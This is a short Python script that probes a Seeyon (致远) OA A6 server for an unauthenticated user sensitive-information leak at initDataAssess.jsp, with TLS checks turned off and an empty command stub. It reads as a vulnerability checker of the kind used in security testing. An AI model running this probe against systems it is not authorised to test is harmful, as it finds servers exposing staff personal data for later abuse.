import time
import argparse
import requests
import multiprocessing
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)




def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def exp_check(target_url):

    vuln_url = target_url + "/yyoa/assess/js/initDataAssess.jsp"
    print(now_time() + " [INFO]     正在检测致远OA A6 initDataAssess.jsp 用户敏感信息泄露漏洞")
    print(now_time() + " [INFO]     正在请求 {}".format(vuln_url))
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=10)
        if "/yyoa/index.jsp" not in response.text and "personList" in response.text and response.status_code == 200:
            return 1
        else:
            return 2
    except:
        return 3

def exp_cmd(url, cmd):
        pass





